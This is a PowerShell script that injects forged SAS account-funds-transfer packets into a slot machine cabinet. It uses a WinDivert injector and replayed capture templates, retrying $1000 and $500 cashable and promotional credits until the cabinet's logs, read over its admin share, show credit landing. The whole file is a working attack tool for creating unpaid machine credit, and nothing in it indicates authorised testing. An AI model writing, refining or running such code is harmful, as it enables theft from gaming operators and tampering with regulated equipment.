[CmdletBinding()]
param(
    [string] $CabinetIP = '10.0.0.90',
    [int] $MaxRounds = 20,
    [int] $DelayAfterInjectSec = 20,
    [int] $DelayBetweenMethodsSec = 5
)
Set-StrictMode -Version Latest
$ErrorActionPreference = 'Continue'
$repo = 'C:\Users\Ezbogar\GoldclubLogInvestigator'
$capDir = Join-Path $repo 'tactic-c-credit-meter-inject\captured_payloads'
. (Join-Path $capDir 'Build-CapturedAftPayload.ps1')
$winDivert = Join-Path $repo 'Invoke-WinDivertAft.ps1'
$slotBase = "\\$CabinetIP\c$\Goldclub\var\log\SlotLog"

function Get-SlotLogPath {
    $today = Get-Date -Format 'yyyy-MM-dd'
    $p = Join-Path $slotBase "$today.log"
    if (Test-Path -LiteralPath $p) { return $p }
    Get-ChildItem -LiteralPath $slotBase -Filter '*.log' | Sort-Object Name -Descending | Select-Object -First 1 -ExpandProperty FullName
}

function Test-CreditLanded {
    param([datetime] $SinceUtc)
    $log = Get-SlotLogPath
    if (-not $log) { return $null }
    $hits = @()
    Get-Content -LiteralPath $log -Tail 400 -ErrorAction SilentlyContinue | ForEach-Object {
        $line = $_
        if ($line -notmatch 'Cashless In:|credit state increased') { return }
        if ($line -match '^(\S+)') {
            $tsText = $Matches[1]
            try {
                $dt = if ($tsText -match 'T') { [datetimeoffset]::Parse($tsText).UtcDateTime } else { [datetime]::Parse($tsText) }
                if ($dt -ge $SinceUtc.AddSeconds(-5)) { $hits += $line }
            } catch { $hits += $line }
        }
    }
  if ($hits.Count -gt 0) { return $hits[-1] }
  return $null
}

function Invoke-MethodInject {
    param([hashtable] $M)
    Write-Host "`n--- Method: $($M.Name) ---" -ForegroundColor Cyan
    Write-Host $M.Description
    $since = [datetime]::UtcNow
    try {
        switch ($M.Kind) {
            'windivert' {
                $invokeArgs = @{
                    Send              = $true
                    ComputerName      = $CabinetIP
                    Amount            = $M.AmountCents
                    AssetNumber       = $M.Asset
                }
                if ($M.TxnNumber -gt 0) { $invokeArgs.TransactionNumber = $M.TxnNumber }
                switch ($M.Type) {
                    'cashable' { $invokeArgs.Cashable = $true }
                    'restricted' { $invokeArgs.Restricted = $true }
                    default { $invokeArgs.NonRestricted = $true }
                }
                & $winDivert @invokeArgs 2>&1 | ForEach-Object { Write-Host $_ }
            }
            'capture-template' {
                $pkt = New-AftFromCaptureTemplate -TemplateId $M.TemplateId -AmountCents $M.AmountCents -TransferType $M.Type -TxnNumber $M.TxnNumber
                $report = Format-AftPacketReport $pkt
                Write-Host "Built SAS: $($report.SasHex.Substring(0, [Math]::Min(60, $report.SasHex.Length)))..."
                $invokeArgs = @{
                    Send              = $true
                    ComputerName      = $CabinetIP
                    Amount            = $M.AmountCents
                    AssetNumber       = $M.Asset
                }
                if ($M.TxnNumber -gt 0) { $invokeArgs.TransactionNumber = $M.TxnNumber }
                switch ($M.Type) {
                    'cashable' { $invokeArgs.Cashable = $true }
                    'restricted' { $invokeArgs.Restricted = $true }
                    default { $invokeArgs.NonRestricted = $true }
                }
                & $winDivert @invokeArgs 2>&1 | ForEach-Object { Write-Host $_ }
            }
        }
    } catch {
        Write-Host "[!] Inject error: $_" -ForegroundColor Red
        return @{ Ok = $false; Since = $since; Error = $_.Exception.Message }
    }
    Start-Sleep -Seconds $DelayAfterInjectSec
    $hit = Test-CreditLanded -SinceUtc $since
    return @{ Ok = [bool]$hit; Hit = $hit; Since = $since }
}

# Build method queue from captured templates + standard variants
$methods = @(
    @{ Name='WinDivert promo $1000'; Kind='windivert'; Type='non-restricted'; AmountCents=100000; Asset=777; TxnNumber=0; Description='Standard promo path (Invoke-WinDivertAft -nr)' }
    @{ Name='WinDivert cashable $1000'; Kind='windivert'; Type='cashable'; AmountCents=100000; Asset=777; TxnNumber=0; Description='Cashable bucket from capture txn50 pattern' }
    @{ Name='Capture template aft-txn48'; Kind='capture-template'; TemplateId='aft-txn48'; Type='non-restricted'; AmountCents=100000; Asset=777; TxnNumber=0; Description='Rebuild from live $1000 promo capture' }
    @{ Name='Capture template aft-txn50 cashable'; Kind='capture-template'; TemplateId='aft-txn50'; Type='cashable'; AmountCents=100000; Asset=777; TxnNumber=0; Description='Cashable capture baseline' }
    @{ Name='WinDivert promo $500'; Kind='windivert'; Type='non-restricted'; AmountCents=50000; Asset=777; TxnNumber=0; Description='Lower amount promo' }
    @{ Name='WinDivert cashable $500'; Kind='windivert'; Type='cashable'; AmountCents=50000; Asset=777; TxnNumber=0; Description='Lower amount cashable' }
)

Write-Host '=============================================================' -ForegroundColor White
Write-Host 'Retry Until Credit Lands - Cabinet' $CabinetIP -ForegroundColor White
Write-Host '=============================================================' -ForegroundColor White
Write-Host "SAS heartbeat check..."
$sasLog = "\\$CabinetIP\c$\Goldclub\var\log\GoldClub.Aurum.Services sasmsgr of SASControler1\$(Get-Date -Format 'yyyy-MM-dd').log"
if (Test-Path $sasLog) {
    $hb = Get-Content $sasLog -Tail 5 | Select-String 'qGMID1:8'
    if ($hb) { Write-Host '[+] SAS link active (80/81 polls)' -ForegroundColor Green } else { Write-Host '[!] No recent SAS polls - injection may fail' -ForegroundColor Yellow }
}

$round = 0
while ($round -lt $MaxRounds) {
    $round++
    Write-Host "`n========== ROUND $round / $MaxRounds ==========" -ForegroundColor Yellow
    foreach ($m in $methods) {
        $m = $m.Clone()
        if ($m.TxnNumber -eq 0) { $m.TxnNumber = 200 + $round * 10 + ($methods.IndexOf($m)) }
        $result = Invoke-MethodInject -M $m
        if ($result.Ok) {
            Write-Host "`n[+] CREDIT LANDED via $($m.Name)" -ForegroundColor Green
            Write-Host "    $($result.Hit)" -ForegroundColor Green
            exit 0
        }
        Write-Host "[!] No credit evidence for $($m.Name)" -ForegroundColor Red
        Start-Sleep -Seconds $DelayBetweenMethodsSec
    }
}
Write-Host "`n[!] Exhausted $MaxRounds rounds without credit landing" -ForegroundColor Red
exit 1